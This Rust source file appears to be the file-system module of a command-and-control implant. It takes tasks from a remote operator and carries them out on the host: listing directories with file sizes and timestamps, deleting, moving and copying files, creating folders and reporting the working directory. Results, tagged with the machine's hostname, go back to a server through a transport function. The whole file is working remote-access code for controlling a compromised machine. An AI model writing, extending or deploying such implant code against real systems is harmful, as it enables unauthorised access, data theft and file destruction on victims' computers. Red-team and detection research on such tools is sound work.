use std::fs;
use std::path::Path;
use std::io::Write;
use std::time::UNIX_EPOCH;

fn resolve_path(raw: &str) -> Result<String, Box<dyn std::error::Error>> {
    if raw.is_empty() || raw == "." {
        Ok(std::env::current_dir()?.to_string_lossy().to_string())
    } else {
        Ok(raw.trim_matches(&['"', '\''][..]).to_string())
    }
}

fn timestamp_secs(time: std::io::Result<std::time::SystemTime>) -> u64 {
    time.ok()
        .and_then(|t| t.duration_since(UNIX_EPOCH).ok())
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

fn handle_ls(task: &serde_json::Value, parsed_params: &serde_json::Value) -> Result<(), Box<dyn std::error::Error>> {
    let id = task.get("id").and_then(|v| v.as_str()).ok_or("missing id")?;

    let raw_path = parsed_params.get("path")
        .and_then(|v| v.as_str())
        .unwrap_or(".");
    let path_str = resolve_path(raw_path)?;
    let path_obj = Path::new(&path_str);
    let abs_path = if path_obj.is_absolute() {
        path_obj.to_path_buf()
    } else {
        std::env::current_dir()?.join(path_obj)
    };
    let abs_str = abs_path.to_string_lossy().to_string();

    let parent = abs_path.parent()
        .map(|p| p.to_string_lossy().to_string())
        .unwrap_or_default();
    let dir_name = abs_path.file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or(abs_str.clone());

    let hostname = std::env::var("COMPUTERNAME").unwrap_or_else(|_| "Unknown".to_string());

    let mut file_entries = Vec::new();
    match fs::read_dir(&abs_path) {
        Ok(entries) => {
            for entry in entries {
                let entry = entry?;
                let meta = entry.metadata()?;
                file_entries.push(serde_json::json!({
                    "name": entry.file_name().to_string_lossy().to_string(),
                    "is_file": meta.is_file(),
                    "size": meta.len(),
                    "modify_time": timestamp_secs(meta.modified()),
                    "access_time": timestamp_secs(meta.accessed()),
                }));
            }
        }
        Err(e) => {
            let resp = serde_json::json!({
                "action": "post_response",
                "responses": [{
                    "task_id": id,
                    "file_browser": {
                        "host": hostname,
                        "is_file": false,
                        "name": dir_name,
                        "parent_path": parent,
                        "success": false,
                        "files": []
                    },
                    "user_output": format!("Failed to list {}: {}", abs_str, e),
                    "status": "error"
                }]
            });
            crate::transport::send_request(&serde_json::to_string(&resp)?)?;
            return Ok(());
        }
    }

    let resp = serde_json::json!({
        "action": "post_response",
        "responses": [{
            "task_id": id,
            "file_browser": {
                "host": hostname,
                "is_file": false,
                "name": dir_name,
                "parent_path": parent,
                "success": true,
                "files": file_entries
            },
            "user_output": format!("Listed {} entries in {}", file_entries.len(), abs_str),
            "status": "success"
        }]
    });
    crate::transport::send_request(&serde_json::to_string(&resp)?)?;
    Ok(())
}

pub fn handle_fs_command(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Error>> {
    let command = task.get("command")
        .ok_or("missing command")?
        .as_str()
        .ok_or("command is not a string")?;

    let raw_params = task.get("parameters")
        .ok_or("missing parameters")?
        .as_str()
        .ok_or("parameters is not a string")?;

    let parsed_params: serde_json::Value = if raw_params.is_empty() {
        serde_json::json!({})
    } else {
        serde_json::from_str(raw_params)?
    };

    // ls has its own handler for file_browser support
    if command == "ls" {
        return handle_ls(task, &parsed_params);
    }

    // Handle arg1
    let raw_path1 = parsed_params.get("arg1")
        .and_then(|v| v.as_str())
        .unwrap_or(".");
    let path1 = resolve_path(raw_path1)?;
    let path_obj1 = Path::new(&path1);

    // Handle arg2
    let raw_path2 = parsed_params.get("arg2")
        .and_then(|v| v.as_str())
        .unwrap_or(".");
    let path2 = resolve_path(raw_path2)?;
    let path_obj2 = Path::new(&path2);


    let output = match command {

        "rm" => {
            if path_obj1.exists() {
                match fs::remove_file(&path_obj1) {
                    Ok(_) => format!("Deleted file: {}", path1),
                    Err(e) => format!("Failed to delete {}: {}", path1, e),
                }
            } else {
                format!("File does not exist: {}", path1)
            }
        }

        "mkdir" => match fs::create_dir_all(&path_obj1) {
            Ok(_) => format!("Created directory: {}", path1),
            Err(e) => format!("Failed to create directory {}: {}", path1, e),
        }

        "mv" => match fs::rename(&path_obj1, &path_obj2) {
            Ok(_) => format!("Moved from {} to {}", path1, path2),
            Err(e) => format!("Failed to move {}: {}", path1, e),
        }

        "cp" => match fs::copy(&path_obj1, &path_obj2) {
            Ok(_) => format!("Copied from {} to {}", path1, path2),
            Err(e) => format!("Failed to copy {}: {}", path1, e),
        }

        "touch" => match fs::OpenOptions::new().create(true).write(true).open(&path_obj1) {
            Ok(mut file) => {
                file.write_all(b"")?;
                format!("Touched file: {}", path1)
            }
            Err(e) => format!("Failed to touch file {}: {}", path1, e),
        }

        "pwd" => match std::env::current_dir() {
            Ok(pwd) => pwd.to_string_lossy().to_string(),
            Err(e) => format!("Failed to get current directory: {}", e),
        }

        _ => return Err("unsupported command".into()),
    };

    let response_json = serde_json::json!({
        "action": "post_response",
        "responses": [
            {
                "task_id": task.get("id").unwrap().as_str().unwrap(),
                "user_output": output,
                "timestamp": task.get("timestamp").unwrap().as_f64().unwrap(),
                "status": "success",
            }
        ]
    });

    let response_value = serde_json::to_string(&response_json)?;
    crate::transport::send_request(&response_value)?;
    Ok(())
}
